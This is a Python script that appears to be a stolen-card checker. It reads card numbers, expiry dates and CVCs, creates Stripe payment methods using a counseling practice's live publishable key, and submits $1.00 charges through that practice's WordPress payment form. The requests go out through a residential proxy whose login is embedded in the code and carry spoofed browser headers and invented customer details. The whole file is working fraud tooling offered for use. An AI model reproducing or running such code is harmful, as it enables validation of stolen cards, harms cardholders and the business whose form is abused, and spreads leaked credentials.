import requests,re
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "bd.porterproxies.com:8888:user-PP_FBBG3PY7GO-country-US-plan-luminati:nsugwlie"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	url = "https://api.stripe.com/v1/payment_methods"
	
	payload = {
	  'type': "card",
	  'card[number]': f"{n}",
	  'card[cvc]': f"{cvc}",
	  'card[exp_month]': f"{mm}",
	  'card[exp_year]': f"{yy}",
	  'payment_user_agent': "stripe.js/b2e402148c; stripe-js-v3/b2e402148c; card-element",
	  'key': "pk_live_51GTo7cBVMPeY2b3ErXry9SNWZIENLLa09N6bxm8lVODmDv0zb6q6gbGUMAHBpLJTHapGhUws5u7aphFV8kz7zPY500NSjbv9zQ",
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
	  'Accept': "application/json",
	  'authority': "api.stripe.com",
	  'accept-language': "en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5",
	  'origin': "https://js.stripe.com",
	  'referer': "https://js.stripe.com/",
	  'sec-ch-ua': "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'sec-fetch-dest': "empty",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-site': "same-site"
	}
	
	response = requests.post(url, data=payload, headers=headers)
	
	pm = response.json()['id']
	
	url = "https://www.horizonscounseling.com/wp-admin/admin-ajax.php"
	
	payload = {
	  'wpforms[fields][0]': 'Rodam User',
	  'wpforms[fields][8]': '',
	  'wpforms[fields][1]': 'rodamuser08@gmail.com',
	  'wpforms[fields][2]': '(430) 300-0850',
	  'wpforms[fields][11]': '1.00',
	  'wpforms[stripe-credit-card-cardname]': 'Dao Khao Saard',
	  'wpforms[hp]': '',
	  'wpforms[id]': '1853',
	  'page_title': 'Make a Payment',
	  'page_url': 'https://www.horizonscounseling.com/make-a-payment/',
	  'page_id': '1668',
	  'wpforms[post_id]': '1668',
	  'wpforms[payment_method_id]': f'{pm}',
	  'wpforms[token]': 'bb798db94b5fc0fe4a287988667d32c1',
	  'action': 'wpforms_submit',
	  'start_timestamp': '1748333545524',
	  'end_timestamp': '1748333583925'
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
	  'Accept': "application/json, text/javascript, */*; q=0.01",
	  'authority': "www.horizonscounseling.com",
	  'accept-language': "en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5",
	  'origin': "https://www.horizonscounseling.com",
	  'referer': "https://www.horizonscounseling.com/make-a-payment/",
	  'sec-ch-ua': "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'sec-fetch-dest': "empty",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-site': "same-origin",
	  'x-requested-with': "XMLHttpRequest"
	}
	
	response = session.post(url, data=payload, headers=headers)
	
	try:
		result = re.search(r'<p>(.*?)<\\/p>', response.text).group(1)
	except:
		result = response.text
	
	return (result)
